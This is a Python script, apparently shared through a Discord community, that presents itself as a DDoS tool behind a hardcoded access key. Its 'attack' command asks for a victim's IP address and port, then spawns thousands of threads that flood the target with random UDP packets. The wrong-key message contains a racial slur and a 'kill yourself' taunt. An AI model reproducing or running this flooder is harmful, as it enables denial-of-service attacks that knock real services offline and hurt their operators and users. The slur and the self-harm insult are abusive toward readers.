from colorama import Fore, Back
import random, time, socket, os, threading

def clear():
    os.system("cls" if os.name == "nt" else "clear")

clear()

print(f"{Fore.RED}Made By neo1sback")
print(f"Discord Server: https://discord.gg/dA5JCz7A{Fore.RESET}")
key = input("🔑 Key: ")



if key == "Neo":
    pass

else:
    print("Wrong Key, K Y S Nigga 💀")
    quit()

os.system("cls" if os.name == "nt" else "clear")



print(f"{Fore.RED}Made By neo1sback")
print(f"Discord Server: https://discord.gg/dA5JCz7A{Fore.RESET}")
welcome = f"""{Fore.LIGHTRED_EX}
\t\t\t\t\t                                       
$$$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\        $$$$$$$\                  $$\   $$\                     
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\       $$  __$$\                 $$$\  $$ |                    
$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ /  \__|      $$ |  $$ |$$\   $$\       $$$$\ $$ | $$$$$$\   $$$$$$\  
$$ |  $$ |$$ |  $$ |$$ |  $$ |\$$$$$$\        $$$$$$$\ |$$ |  $$ |      $$ $$\$$ |$$  __$$\ $$  __$$\ 
$$ |  $$ |$$ |  $$ |$$ |  $$ | \____$$\       $$  __$$\ $$ |  $$ |      $$ \$$$$ |$$$$$$$$ |$$ /  $$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |      $$ |  $$ |$$ |  $$ |      $$ |\$$$ |$$   ____|$$ |  $$ |
$$$$$$$  |$$$$$$$  | $$$$$$  |\$$$$$$  |      $$$$$$$  |\$$$$$$$ |      $$ | \$$ |\$$$$$$$\ \$$$$$$  |
\_______/ \_______/  \______/  \______/       \_______/  \____$$ |      \__|  \__| \_______| \______/ 
                                                        $$\   $$ |                                    
                                                        \$$$$$$  |                                    
                                                         \______/                                                               
                              
\t\t\t\t\t
\t\t\t\t\t
\t\t\t\t\t
\t\t\t\t\t. {Fore.RESET}
\t\t\t\t\t
\t\t\t\t\t       Type daxmareba For Usage
\t\t\t\t\t"""

print(welcome)

while True:
    rt = input("Neo > ")

    if rt == "daxmareba" or rt == "daxmareba" or rt == "daxmareba":
        print("""
╔════════════════════════════════════════════════════════╗
║  !sheteva dawere                                      ║
║                                                        ║
║  !gasvla terminalidan gaomosasvlelad                   ║
╚════════════════════════════════════════════════════════╝
        """)

    elif rt == "!sheteva" or rt == "!sheteva" or rt == "!sheteva":
        ip = input("Msxverplis IP: ")
        port = int(input("Msxverplis Port: "))
        threads = int(input("Dawere 5000: "))

        def attack():
            attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            attack.connect((ip, port))

            for i in range(1, 100 * 1000):
                try:
                    attack.send(random._urandom(10) * 1000)
                except ConnectionRefusedError:
                    pass
            print(f"Send: {i}", end='\r')

        for i in range(threads):
            t = threading.Thread(target=attack)
            t.start()

    elif rt == "cls" or rt == "CLS" or rt == "clear" or rt == "CLEAR" or rt == "Cls" or rt == "Clear":
        clear()
        print(welcome)
    elif rt == "!gasvla" or rt == "!gasvla" or rt == "!gasvla":
        quit()